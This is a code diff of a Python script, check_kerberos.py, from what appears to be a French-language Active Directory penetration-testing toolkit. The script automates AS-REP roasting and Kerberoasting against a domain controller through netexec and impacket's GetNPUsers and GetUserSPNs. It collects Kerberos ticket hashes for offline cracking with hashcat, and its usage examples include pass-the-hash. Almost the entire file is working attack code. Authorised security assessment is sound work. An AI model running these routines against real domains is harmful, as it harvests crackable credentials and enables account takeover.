@@ -1,5 +1,23 @@
 #!/usr/bin/env python3
-"""check_kerberos.py - Kerberos user enumeration, AS-REP roasting and Kerberoasting"""
+"""check_kerberos.py — AS-REP Roasting & Kerberoasting.
+
+Recentré sur les deux attaques Kerberos (plus d'énumération/bruteforce de comptes :
+l'énum authentifiée des users est couverte par check_ldap). check_kerberos garde sa
+valeur propre : l'AS-REP roasting **sans creds** (comptes DONT_REQ_PREAUTH, via une
+liste de comptes `--users`) et les fallbacks **impacket** (GetNPUsers / GetUserSPNs)
+quand nxc n'est pas là.
+
+  STEP 1  Détection du domaine (si -d absent).
+  STEP 2  AS-REP Roasting — avec creds : nxc ldap --asreproast ; sans creds :
+          GetNPUsers -no-pass sur la liste `--users` (comptes assainis).
+  STEP 3  Kerberoasting (exige des creds) — nxc ldap --kerberoasting, fallback
+          GetUserSPNs.
+
+Overlap assumé avec check_ldap (roasting authentifié, demandé). Deux correctifs
+intégrés : assainissement des comptes (`DOMAIN\\user` / `user@realm` → sAMAccountName
+nu, sinon GetNPUsers échoue) et détection du **clock-skew** Kerberos (KRB_AP_ERR_SKEW)
+avec remédiation (synchroniser l'horloge sur le DC).
+"""
 
 import argparse
 import os
@@ -11,31 +29,13 @@ import sys
 from datetime import datetime
 from pathlib import Path
 
-# ---------------------------------------------------------------------------
-# Colours & logging
-# ---------------------------------------------------------------------------
-
 from npns_common import (C, RULE, log_info, log_ok, log_warn, log_err, log_step,
                          tool_exists, confirm_step, set_total_steps, enable_auto_accept,
-                         emit_progress, timed_out)
+                         emit_progress)
 
 
-set_total_steps(4)
+set_total_steps(3)
 
-
-# ---------------------------------------------------------------------------
-# Built-in common AD username wordlist
-# ---------------------------------------------------------------------------
-
-COMMON_AD_USERS = [
-    "administrator", "admin", "guest", "krbtgt", "backup", "helpdesk",
-    "support", "service", "svc", "svcadmin", "serviceaccount",
-    "it", "itadmin", "sysadmin", "webmaster", "test", "dev",
-    "developer", "sql", "sqlservice", "exchange", "sharepoint",
-    "operator", "monitor", "scanner", "security", "audit",
-    "readonly", "viewer", "reporter", "manager", "user", "vpn",
-    "remote", "backup", "sa", "oracle", "postgres", "mysql",
-]
 
 # ---------------------------------------------------------------------------
 # Helpers
@@ -50,22 +50,21 @@ def run(cmd: str, timeout: int = 300):
 
 
 def write_list(path: Path, items):
-    """Write a sorted, deduplicated list to a file."""
+    """Écrit une liste triée dédupliquée."""
     unique = sorted(set(i.strip() for i in items if i.strip()))
     path.write_text("\n".join(unique) + ("\n" if unique else ""))
     return unique
 
 
 def resolve_targets(target: str) -> list[str]:
-    """Return a list of IPs/hostnames from a file, single IP, or CIDR."""
     p = Path(target)
     if p.is_file():
-        return [l.strip() for l in p.read_text().splitlines() if l.strip() and not l.startswith("#")]
+        return [l.strip() for l in p.read_text().splitlines()
+                if l.strip() and not l.startswith("#")]
     return [target]
 
 
-def build_cred_args(username: str, password: str | None, hash_: str | None, domain: str | None) -> str:
-    """Return nxc credential arguments."""
+def build_cred_args(username, password, hash_, domain) -> str:
     args = f"-u {shlex.quote(username)}"
     if hash_:
         args += f" -H {shlex.quote(hash_)}"
@@ -76,232 +75,225 @@ def build_cred_args(username: str, password: str | None, hash_: str | None, doma
     return args
 
 
+def sanitize_username(u: str) -> str:
+    """`CORP\\jdoe` / `jdoe@corp.local` → `jdoe` (sAMAccountName nu).
+
+    GetNPUsers attend des sAMAccountName nus dans -usersfile : un suffixe realm
+    ou un préfixe domaine faisait échouer silencieusement toute la liste."""
+    u = u.strip()
+    if not u or u.startswith("#"):
+        return ""
+    if "\\" in u:
+        u = u.split("\\", 1)[1]
+    if "@" in u:
+        u = u.split("@", 1)[0]
+    return u.strip()
+
+
+def sanitized_userfile(users_file: str, out: Path) -> Path | None:
+    """Réécrit `--users` en comptes assainis dans le dossier de sortie."""
+    src = Path(users_file)
+    if not src.is_file():
+        log_warn(f"--users : fichier introuvable ({users_file})")
+        return None
+    names = [sanitize_username(l) for l in src.read_text().splitlines()]
+    names = [n for n in names if n]
+    if not names:
+        log_warn("--users : aucun compte exploitable après nettoyage")
+        return None
+    dst = out / "_krb_userlist_clean.txt"
+    dst.write_text("\n".join(sorted(set(names))) + "\n")
+    log_info(f"{len(set(names))} compte(s) assaini(s) → {dst.name}")
+    return dst
+
+
+_SKEW_RE = re.compile(r"(KRB_AP_ERR_SKEW|clock skew too great)", re.I)
+
+
+def warn_clock_skew(text: str, dc_ip: str) -> bool:
+    """Détecte un décalage d'horloge Kerberos et conseille la synchro sur le DC."""
+    if _SKEW_RE.search(text or ""):
+        log_warn("Clock skew Kerberos détecté (KRB_AP_ERR_SKEW) — l'horloge locale "
+                 "diffère trop du DC.")
+        log_warn(f"    Corrige p.ex. :  sudo ntpdate {dc_ip}   "
+                 f"(ou  sudo rdate -n {dc_ip} , ou via faketime)")
+        return True
+    return False
+
+
+def find_impacket(*names) -> str | None:
+    for n in names:
+        p = shutil.which(n)
+        if p:
+            return p
+    return None
+
+
 # ---------------------------------------------------------------------------
-# Steps
+# STEP 1 — Détection du domaine
 # ---------------------------------------------------------------------------
 
-def step1_domain_detection(hosts: list[str], out: Path, domain: str | None) -> str | None:
-    """Try to detect domain from DC hostname via nxc smb."""
+def step1_domain(hosts: list[str], out: Path, domain: str | None) -> str | None:
     log_step("STEP 1 — Domain detection")
     if domain:
-        log_info(f"Domain provided: {domain}")
+        log_info(f"Domaine fourni : {domain}")
         return domain
-
     if not hosts:
-        log_warn("No hosts — skipping domain detection")
+        log_warn("Aucune cible — détection impossible")
         return None
 
     dc_ip = hosts[0]
     if tool_exists("nxc") and confirm_step("STEP 1 — Domain detection", f"nxc smb {dc_ip}"):
-        stdout, _, _ = run(f"nxc smb {dc_ip} 2>/dev/null", timeout=30)
+        stdout, _, _ = run(f"nxc smb {shlex.quote(dc_ip)} 2>/dev/null", timeout=30)
         m = re.search(r'domain:([^\s\)]+)', stdout, re.IGNORECASE)
         if m:
             detected = m.group(1).strip()
-            log_ok(f"Detected domain: {detected}")
+            log_ok(f"Domaine détecté : {detected}")
             (out / "krb_domain_info.txt").write_text(detected + "\n")
             return detected
-    log_warn("Could not auto-detect domain. Use -d to specify it.")
+    log_warn("Domaine non détecté — utilise -d pour le préciser.")
     return None
 
 
-def step2_user_enum(hosts: list[str], out: Path, domain: str | None, wordlist: str | None):
-    """Enumerate valid Kerberos users via kerbrute or GetNPUsers."""
-    log_step("STEP 2 — User enumeration via Kerberos")
+# ---------------------------------------------------------------------------
+# STEP 2 — AS-REP Roasting
+# ---------------------------------------------------------------------------
+
+def step_asrep(hosts, out, domain, username, password, hash_, users_file):
+    log_step("STEP 2 — AS-REP Roasting")
     if not domain:
-        log_warn("Domain required for user enumeration — skipping (use -d)")
-        return
-
-    if not hosts:
-        log_warn("No hosts — skipping user enumeration")
-        return
-
-    # Build wordlist — keep it inside the output dir (predictable /tmp names
-    # can collide between concurrent runs and leak the target user list).
-    if wordlist and Path(wordlist).is_file():
-        wl_path = Path(wordlist)
-    else:
-        wl_path = out / "_krb_builtin_users.txt"
-        wl_path.write_text("\n".join(COMMON_AD_USERS) + "\n")
-        log_info(f"Using built-in wordlist ({len(COMMON_AD_USERS)} usernames)")
-
-    dc_ip = hosts[0]
-    valid_file = out / "kerberos_valid_users.txt"
-
-    if not confirm_step("STEP 2 — User enumeration", f"kerbrute userenum --dc {dc_ip} -d {domain} <wordlist>  (or GetNPUsers.py fallback)"):
-        return
-
-    if tool_exists("kerbrute"):
-        log_info(f"Running kerbrute userenum against {dc_ip}")
-        stdout, stderr, _ = run(
-            f"kerbrute userenum --dc {shlex.quote(dc_ip)} -d {shlex.quote(domain)} {shlex.quote(str(wl_path))} 2>&1",
-            timeout=120,
-        )
-        (out / "kerbrute_raw.txt").write_text(stdout + stderr)
-        valid = re.findall(r'VALID USERNAME:\s+(\S+)', stdout)
-        if valid:
-            write_list(valid_file, valid)
-            log_ok(f"Found {len(valid)} valid users → {valid_file}")
-        else:
-            log_info("No valid users found via kerbrute")
-        return
-
-    # Fallback: GetNPUsers without hash request just to validate users
-    getnpusers = shutil.which("GetNPUsers.py") or shutil.which("impacket-GetNPUsers")
-    if getnpusers:
-        log_info(f"Running {getnpusers} for user validation")
-        stdout, stderr, _ = run(
-            f"python3 {shlex.quote(getnpusers)} {shlex.quote(domain)}/ -dc-ip {shlex.quote(dc_ip)} -no-pass -usersfile {shlex.quote(str(wl_path))} 2>&1",
-            timeout=180,
-        )
-        (out / "getnpusers_enum_raw.txt").write_text(stdout + stderr)
-        valid = re.findall(r'\$krb5asrep\$[^\s]+', stdout)
-        users_from_errors = re.findall(r'User (\S+) doesn\'t have UF_DONT_REQUIRE_PREAUTH', stdout)
-        all_valid = valid + users_from_errors
-        if all_valid:
-            write_list(valid_file, all_valid)
-            log_ok(f"Validated {len(all_valid)} users → {valid_file}")
-        return
-
-    log_warn("Neither kerbrute nor GetNPUsers.py found — skipping user enumeration")
-    log_warn("Install: pip install impacket  OR  apt install kerbrute")
-
-
-def step3_asrep_roast(hosts: list[str], out: Path, domain: str | None,
-                      username: str | None, password: str | None,
-                      hash_: str | None, users_file: str | None):
-    """AS-REP roasting — accounts without Kerberos pre-auth."""
-    log_step("STEP 3 — AS-REP Roasting")
-    if not domain:
-        log_warn("Domain required for AS-REP roasting — skipping (use -d)")
+        log_warn("Domaine requis (-d) — AS-REP ignoré.")
         return
     if not hosts:
-        log_warn("No hosts — skipping AS-REP roasting")
+        log_warn("Aucune cible — AS-REP ignoré.")
         return
 
     dc_ip = hosts[0]
     hash_file = out / "kerberos_asrep_hashes.txt"
+    has_creds = bool(username and (password is not None or hash_))
 
-    if not confirm_step("STEP 3 — AS-REP Roasting", f"nxc ldap {dc_ip} --asreproast  (or GetNPUsers.py -no-pass fallback)"):
+    detail = ("nxc ldap <dc> --asreproast" if has_creds
+              else "GetNPUsers.py -no-pass -usersfile <--users>")
+    if not confirm_step("STEP 2 — AS-REP Roasting", detail):
         return
 
-    # With credentials → use nxc ldap --asreproast
-    if (username and (password is not None or hash_)) and tool_exists("nxc"):
+    # --- Avec creds : nxc ldap --asreproast (énumère seul les DONT_REQ_PREAUTH) ---
+    if has_creds and tool_exists("nxc"):
         creds = build_cred_args(username, password, hash_, domain)
-        log_info(f"AS-REP roasting via nxc ldap (authenticated)")
+        log_info("AS-REP roasting via nxc ldap (authentifié)")
         stdout, stderr, _ = run(
             f"nxc ldap {shlex.quote(dc_ip)} {creds} --asreproast {shlex.quote(str(hash_file))} 2>&1",
-            timeout=120,
-        )
+            timeout=120)
         (out / "nxc_asreproast_raw.txt").write_text(stdout)
-        if timed_out(stderr):
-            log_warn("nxc timed out during AS-REP roasting — résultat INCOMPLET "
-                     "(ne pas conclure « pre-auth activé partout »)")
-        elif hash_file.exists() and hash_file.stat().st_size > 0:
-            count = len(hash_file.read_text().splitlines())
-            log_ok(f"Captured {count} AS-REP hash(es) → {hash_file}  [hashcat -m 18200]")
+        warn_clock_skew(stdout + stderr, dc_ip)
+        if hash_file.exists() and hash_file.stat().st_size > 0:
+            n = len([l for l in hash_file.read_text().splitlines() if l.strip()])
+            log_warn(f"[CRITICAL] {n} hash(es) AS-REP → {hash_file.name}  [hashcat -m 18200]")
         else:
-            log_info("No AS-REP hashes found (all accounts have pre-auth enabled)")
+            log_info("Aucun compte AS-REP roastable (préauth activée partout).")
         return
 
-    # Without credentials → use GetNPUsers against known users
-    getnpusers = shutil.which("GetNPUsers.py") or shutil.which("impacket-GetNPUsers")
-    if not getnpusers:
-        log_warn("GetNPUsers.py not found — skipping AS-REP roasting")
-        log_warn("Install: pip install impacket")
+    # --- Sans creds : GetNPUsers -no-pass sur une liste de comptes ---
+    getnp = find_impacket("GetNPUsers.py", "impacket-GetNPUsers")
+    if not getnp:
+        log_warn("GetNPUsers.py introuvable (pip install impacket) — AS-REP sans creds ignoré.")
         return
-
-    # Determine user list
-    if users_file and Path(users_file).is_file():
-        uf = users_file
-    elif (out / "kerberos_valid_users.txt").exists():
-        uf = str(out / "kerberos_valid_users.txt")
-    else:
-        uf = None
-
+    if not users_file:
+        log_warn("AS-REP sans creds : fournis une liste de comptes via --users <fichier> "
+                 "(plus d'énumération intégrée — voir check_ldap pour l'énum authentifiée).")
+        return
+    uf = sanitized_userfile(users_file, out)
     if not uf:
-        log_warn("No user list available for unauthenticated AS-REP roasting (run step 2 first or use --users)")
         return
 
-    log_info(f"Running GetNPUsers against {dc_ip} with user list {uf}")
+    log_info(f"GetNPUsers -no-pass contre {dc_ip} ({uf.name})")
     stdout, stderr, _ = run(
-        f"python3 {shlex.quote(getnpusers)} {shlex.quote(domain)}/ -dc-ip {shlex.quote(dc_ip)} -no-pass -usersfile {shlex.quote(str(uf))} -format hashcat 2>&1",
-        timeout=180,
-    )
+        f"python3 {shlex.quote(getnp)} {shlex.quote(domain)}/ -dc-ip {shlex.quote(dc_ip)} "
+        f"-no-pass -usersfile {shlex.quote(str(uf))} -format hashcat 2>&1",
+        timeout=240)
     (out / "getnpusers_asrep_raw.txt").write_text(stdout + stderr)
+    if warn_clock_skew(stdout + stderr, dc_ip):
+        log_warn("AS-REP probablement faussé par le skew — relance après synchro.")
     hashes = re.findall(r'\$krb5asrep\$[^\s]+', stdout)
     if hashes:
         write_list(hash_file, hashes)
-        log_ok(f"Captured {len(hashes)} AS-REP hash(es) → {hash_file}  [hashcat -m 18200]")
+        log_warn(f"[CRITICAL] {len(hashes)} hash(es) AS-REP → {hash_file.name}  [hashcat -m 18200]")
     else:
-        log_info("No AS-REP hashes found")
+        log_info("Aucun hash AS-REP (aucun compte DONT_REQ_PREAUTH dans la liste).")
 
 
-def step4_kerberoast(hosts: list[str], out: Path, domain: str | None,
-                     username: str | None, password: str | None, hash_: str | None):
-    """Kerberoasting — accounts with SPNs."""
-    log_step("STEP 4 — Kerberoasting")
-    if not (username and domain):
-        log_warn("Kerberoasting requires credentials (-u/-p/-H -d) — skipping")
+# ---------------------------------------------------------------------------
+# STEP 3 — Kerberoasting
+# ---------------------------------------------------------------------------
+
+def step_kerberoast(hosts, out, domain, username, password, hash_):
+    log_step("STEP 3 — Kerberoasting")
+    if not (username and (password is not None or hash_)):
+        log_warn("Kerberoasting exige des creds (-u + -p/-H) — ignoré.")
+        return
+    if not domain:
+        log_warn("Domaine requis (-d) — Kerberoasting ignoré.")
         return
     if not hosts:
-        log_warn("No hosts — skipping Kerberoasting")
+        log_warn("Aucune cible — Kerberoasting ignoré.")
         return
 
     dc_ip = hosts[0]
     spn_file = out / "kerberos_spn_hashes.txt"
 
-    if not confirm_step("STEP 4 — Kerberoasting", f"nxc ldap {dc_ip} --kerberoasting  (or GetUserSPNs.py -request fallback)"):
+    if not confirm_step("STEP 3 — Kerberoasting",
+                        "nxc ldap <dc> --kerberoasting  (fallback GetUserSPNs.py -request)"):
         return
 
-    # Prefer nxc ldap
+    # --- nxc ldap --kerberoasting ---
     if tool_exists("nxc"):
         creds = build_cred_args(username, password, hash_, domain)
         log_info("Kerberoasting via nxc ldap")
         stdout, stderr, _ = run(
             f"nxc ldap {shlex.quote(dc_ip)} {creds} --kerberoasting {shlex.quote(str(spn_file))} 2>&1",
-            timeout=120,
-        )
+            timeout=120)
         (out / "nxc_kerberoast_raw.txt").write_text(stdout)
-        if timed_out(stderr):
-            log_warn("nxc timed out during Kerberoasting — résultat INCOMPLET "
-                     "(ne pas conclure « aucun compte kerberoastable »)")
-        elif spn_file.exists() and spn_file.stat().st_size > 0:
-            count = len(spn_file.read_text().splitlines())
-            log_ok(f"Captured {count} SPN hash(es) → {spn_file}  [hashcat -m 13100]")
-        else:
-            log_info("No Kerberoastable accounts found")
-        return
+        warn_clock_skew(stdout + stderr, dc_ip)
+        if spn_file.exists() and spn_file.stat().st_size > 0:
+            n = len([l for l in spn_file.read_text().splitlines() if l.strip()])
+            log_warn(f"[CRITICAL] {n} hash(es) SPN → {spn_file.name}  [hashcat -m 13100]")
+            return
+        log_info("Aucun compte kerberoastable via nxc (ou skew) — tentative GetUserSPNs…")
 
-    # Fallback: GetUserSPNs.py
-    getspns = shutil.which("GetUserSPNs.py") or shutil.which("impacket-GetUserSPNs")
+    # --- Fallback GetUserSPNs.py ---
+    getspns = find_impacket("GetUserSPNs.py", "impacket-GetUserSPNs")
     if not getspns:
-        log_warn("Neither nxc nor GetUserSPNs.py found — skipping Kerberoasting")
+        log_warn("nxc sans résultat et GetUserSPNs.py introuvable — Kerberoasting incomplet.")
         return
 
-    # Quote every piece: a password containing ';', '$', space, ... would
-    # otherwise break the command or execute arbitrary code (shell=True).
-    cred_str = f"{shlex.quote(f'{domain}/{username}')}"
+    # Tout quoter : un mot de passe avec ';', '$', espace… casserait la commande (shell=True).
+    cred_str = shlex.quote(f"{domain}/{username}")
     if hash_:
         cred_str += f" -hashes {shlex.quote(hash_)}"
     elif password is not None:
         cred_str += f":{shlex.quote(password)}"
 
-    log_info(f"Running {getspns}")
+    log_info(f"Kerberoasting via {Path(getspns).name}")
     stdout, stderr, _ = run(
-        f"python3 {shlex.quote(getspns)} {cred_str} -dc-ip {shlex.quote(dc_ip)} -request -format hashcat 2>&1",
-        timeout=180,
-    )
+        f"python3 {shlex.quote(getspns)} {cred_str} -dc-ip {shlex.quote(dc_ip)} "
+        f"-request -format hashcat 2>&1",
+        timeout=240)
     (out / "getuserspns_raw.txt").write_text(stdout + stderr)
+    if warn_clock_skew(stdout + stderr, dc_ip):
+        log_warn("Kerberoast probablement faussé par le skew — relance après synchro.")
     hashes = re.findall(r'\$krb5tgs\$[^\s]+', stdout)
     if hashes:
         write_list(spn_file, hashes)
-        log_ok(f"Captured {len(hashes)} SPN hash(es) → {spn_file}  [hashcat -m 13100]")
+        log_warn(f"[CRITICAL] {len(hashes)} hash(es) SPN → {spn_file.name}  [hashcat -m 13100]")
     else:
-        log_info("No Kerberoastable accounts found")
+        log_info("Aucun compte kerberoastable.")
 
+
+# ---------------------------------------------------------------------------
+# Résumé
+# ---------------------------------------------------------------------------
 
 def write_summary(out: Path, hosts: list[str], domain: str | None):
-    """Write human-readable summary."""
     lines = [
         "Kerberos Check Summary",
         "=" * 40,
@@ -310,18 +302,12 @@ def write_summary(out: Path, hosts: list[str], domain: str | None):
         f"Domain : {domain or 'unknown'}",
         "",
     ]
-    for fname, label, critical in [
-        ("kerberos_valid_users.txt",  "Valid users found",      False),
-        ("kerberos_asrep_hashes.txt", "AS-REP hashes (m18200)", True),
-        ("kerberos_spn_hashes.txt",   "SPN hashes (m13100)",    True),
-    ]:
+    for fname, label in [("kerberos_asrep_hashes.txt", "AS-REP hashes (m18200)"),
+                         ("kerberos_spn_hashes.txt",   "SPN hashes (m13100)")]:
         p = out / fname
-        if p.exists():
-            count = len([l for l in p.read_text().splitlines() if l.strip()])
-            tag = " [CRITICAL]" if critical and count > 0 else ""
-            lines.append(f"  {label}: {count}{tag}")
-        else:
-            lines.append(f"  {label}: 0")
+        n = len([l for l in p.read_text().splitlines() if l.strip()]) if p.exists() else 0
+        tag = " [CRITICAL]" if n > 0 else ""
+        lines.append(f"  {label}: {n}{tag}")
 
     summary = "\n".join(lines) + "\n"
     (out / "kerberos_summary.txt").write_text(summary)
@@ -334,38 +320,35 @@ def write_summary(out: Path, hosts: list[str], domain: str | None):
 
 def main():
     parser = argparse.ArgumentParser(
-        description="check_kerberos.py — Kerberos user enumeration, AS-REP roasting & Kerberoasting",
+        description="check_kerberos.py — AS-REP Roasting & Kerberoasting",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
-Required tools (install as needed):
-  nxc (netexec)        : apt install netexec
-  kerbrute             : https://github.com/ropnop/kerbrute/releases
-  impacket             : pip install impacket
+Outils (selon l'usage) :
+  nxc (netexec)  : apt install netexec
+  impacket       : pip install impacket   (GetNPUsers.py / GetUserSPNs.py)
 
 Examples:
-  # Unauthenticated user enum + AS-REP
-  python3 check_kerberos.py -t hosts_kerberos.txt -d corp.local
+  # AS-REP sans creds (liste de comptes fournie)
+  python3 check_kerberos.py -t dc01 -d corp.local --users users.txt
 
-  # Authenticated full scan (AS-REP + Kerberoast)
-  python3 check_kerberos.py -t 192.168.1.10 -d corp.local -u jdoe -p 'P@ss123'
+  # AS-REP + Kerberoast authentifiés
+  python3 check_kerberos.py -t 10.0.0.10 -d corp.local -u jdoe -p 'P@ss123'
 
-  # Pass-the-hash Kerberoasting
-  python3 check_kerberos.py -t dc01.corp.local -d corp.local -u admin -H aad3b435b51404eeaad3b435b51404ee:xxxxxx
-""",
-    )
-    parser.add_argument("-t", "--target",   required=True,
-                        help="Host file, single IP, or hostname")
-    parser.add_argument("-o", "--output",   default=None,
-                        help="Output directory (default: ./kerberos_results_<ts>)")
-    parser.add_argument("-u", "--username", default=None, help="Username")
-    parser.add_argument("-p", "--password", default=None, help="Password")
-    parser.add_argument("-H", "--hash",     default=None, help="NTLM hash LM:NT")
-    parser.add_argument("-d", "--domain",   default=None, help="Domain FQDN (e.g. corp.local)")
-    parser.add_argument("--users",          default=None, help="File with usernames for AS-REP roasting")
-    parser.add_argument("--wordlist",       default=None, help="Wordlist for user enumeration")
-
+  # Pass-the-hash
+  python3 check_kerberos.py -t dc01 -d corp.local -u admin -H aad3b435b51404eeaad3b435b51404ee:xxxx
+""")
+    parser.add_argument("-t", "--target", required=True, help="Host file, IP, ou hostname")
+    parser.add_argument("-o", "--output", default=None,
+                        help="Répertoire de sortie (défaut: ./kerberos_results_<ts>)")
+    parser.add_argument("-u", "--username", default=None, help="Utilisateur")
+    parser.add_argument("-p", "--password", default=None, help="Mot de passe")
+    parser.add_argument("-H", "--hash", default=None, help="Hash NTLM LM:NT")
+    parser.add_argument("-d", "--domain", default=None, help="Domaine FQDN (ex. corp.local)")
+    parser.add_argument("--users", default=None,
+                        help="Liste de comptes pour l'AS-REP roasting SANS creds "
+                             "(sAMAccountName ; DOMAIN\\user ou user@realm sont assainis)")
     parser.add_argument("-y", "--yes", action="store_true",
-                        help="Non-interactive: accept all steps (for automation/UI)")
+                        help="Non-interactif : accepte toutes les étapes (automatisation/UI)")
     args = parser.parse_args()
     if getattr(args, "yes", False):
         enable_auto_accept()
@@ -373,25 +356,21 @@ Examples:
     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
     out = Path(args.output) if args.output else Path(f"kerberos_results_{ts}")
     out.mkdir(parents=True, exist_ok=True)
-
     log_info(f"Output directory: {out}")
 
-    # Check tools
-    for tool, pkg in [("nxc", "netexec"), ("kerbrute", "kerbrute binary")]:
-        if not tool_exists(tool):
-            log_warn(f"'{tool}' not found — some checks will be skipped ({pkg})")
+    for tool, pkg in [("nxc", "netexec"), ("GetNPUsers.py", "impacket")]:
+        if not tool_exists(tool) and not shutil.which(tool):
+            log_warn(f"'{tool}' absent — certains chemins seront ignorés ({pkg})")
 
     hosts = resolve_targets(args.target)
     if not hosts:
-        log_warn("No hosts to scan — exiting")
+        log_warn("Aucune cible — sortie.")
         sys.exit(0)
-
     log_info(f"Targets: {len(hosts)} host(s)")
 
-    domain = step1_domain_detection(hosts, out, args.domain)
-    step2_user_enum(hosts, out, domain, args.wordlist)
-    step3_asrep_roast(hosts, out, domain, args.username, args.password, args.hash, args.users)
-    step4_kerberoast(hosts, out, domain, args.username, args.password, args.hash)
+    domain = step1_domain(hosts, out, args.domain)
+    step_asrep(hosts, out, domain, args.username, args.password, args.hash, args.users)
+    step_kerberoast(hosts, out, domain, args.username, args.password, args.hash)
     write_summary(out, hosts, domain)
 
 
